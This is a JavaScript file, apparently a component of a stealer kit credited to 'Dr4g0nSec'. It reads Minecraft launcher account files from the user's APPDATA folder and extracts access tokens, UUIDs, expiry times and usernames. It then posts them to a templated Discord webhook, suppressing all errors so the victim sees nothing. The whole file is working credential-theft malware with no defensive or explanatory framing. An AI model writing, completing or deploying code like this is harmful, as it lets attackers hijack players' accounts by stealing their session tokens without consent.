const fs = require('fs');
const path = require('path');
const axios = require('axios');


const H00K3_URL = "%WEBHOOK%";

const customAvatarUrl = 'https://i.imgur.com/83uCFZe.jpeg';
const appData = process.env.APPDATA;
const minecraftPath = path.join(appData, '.minecraft');

const files = [
    'launcher_accounts.json',
    'usercache.json',
    'launcher_profiles.json',
    'launcher_accounts_microsoft_store.json',
    'accounts.json'
];

files.forEach(fileName => {
    const filePath = path.join(minecraftPath, fileName);

    if (fs.existsSync(filePath)) {
        try {
            const fileContent = fs.readFileSync(filePath, 'utf-8');
            const data = JSON.parse(fileContent);

            if (data.accounts) {
                const accounts = data.accounts;

                for (const accountId in accounts) {
                    const accountData = accounts[accountId];
                    const userInfo = {
                        "<:nether60:1378151260628455454> UUID": accountId,
                        "<a:creative:1200271935695761488> Token de acesso": accountData.accessToken || "",
                        "<:dia53:1378151006600302763> Expira em": accountData.accessTokenExpiresAt || ""
                    };

                    if (accountData.minecraftProfile) {
                        const profileData = accountData.minecraftProfile;
                        userInfo["<:MC_gold_ingot78:1378151010077507724> ID"] = profileData.id || "";
                        userInfo["<:emeraude:1378151008366235779> Nome de usuário"] = profileData.name || "";
                    }

                    const username = userInfo["<:emeraude:1378151008366235779> Nome de usuário"] || "Desconhecido";
                    let avatarUrl = "";

                    if (accountData.minecraftProfile) {
                        avatarUrl = `https://crafatar.com/avatars/${accountData.minecraftProfile.id}?size=64&overlay`;
                    }

                    const embedFields = Object.entries(userInfo).map(([title, value]) => ({
                        name: `**${title}**`,
                        value: `\`\`\`${value || 'Não encontrado.'}\`\`\``,
                        inline: false
                    }));

                    const embed = {
                        title: "Informações do Minecraft",
                        color: 0x250e80,
                        thumbnail: { url: avatarUrl },
                        fields: embedFields,
                        footer: {
                            text: "Created by: sk4rty | Dr4g0nSec on Top!",
                            icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&u=11e73b9dcb21c916c430fd7a540e6d54bd3a1657&v=4"
                        }
                    };

                    const payload = {
                        username: `Dr4g0nSec | Minecraft info - ${username}`,
                        avatar_url: customAvatarUrl,
                        embeds: [embed]
                    };

                    axios.post(H00K3_URL, payload).catch(() => {});
                }
            }
        } catch (err) {}
    }
});
